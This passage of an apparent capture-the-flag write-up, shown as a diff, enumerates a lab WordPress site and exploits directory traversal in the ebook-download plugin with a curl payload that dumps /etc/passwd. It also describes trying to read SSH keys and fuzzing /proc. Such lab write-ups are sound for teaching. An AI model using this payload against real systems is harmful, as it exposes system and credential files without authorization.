@@ -144,4 +144,67 @@ It shows that the only user is `admin` and its version its `5.8.1` which doesn't
 I don't want to start password brute force for user admin so firstly i'll run wpscan again but this time enumerate the plugins present
 
 ```
+Command: wpscan --url http://10.10.11.125/ --plugins-detection aggressive -t100
+```
 
+But since `/wp-content/plugins/` has directory listing i'll get the list of plugins there
+
+And it shows only ebook plugin 
+![image](https://user-images.githubusercontent.com/113513376/221263510-b9d576a4-e3a0-469f-adb1-37c6a1a71d16.png)
+
+Reading the `readme.txt` file shows it version which is ebook 1.1
+![image](https://user-images.githubusercontent.com/113513376/221264671-6166d2bc-acd9-421e-8d1a-fe3226dd0af9.png)
+
+Searching for exploit leads to a directory transversal vulnerability [Exploit](https://www.exploit-db.com/exploits/39575)
+
+#### Exploit
+
+Trying it to read local files works
+
+```
+└─$ curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd'           
+../../../../../../etc/passwd../../../../../../etc/passwd../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+user:x:1000:1000:user:/home/user:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
+<script>window.close()</script> 
+```
+
+I tried reading files like sshkey but it doesn't work
+
+Now if you remember there's a service running on port 1337
+
+I will fuzz for process in /proc/FUZZ/cmdline
+
+I made a quick script which is dirty but will do the work smh [Fuzz]()
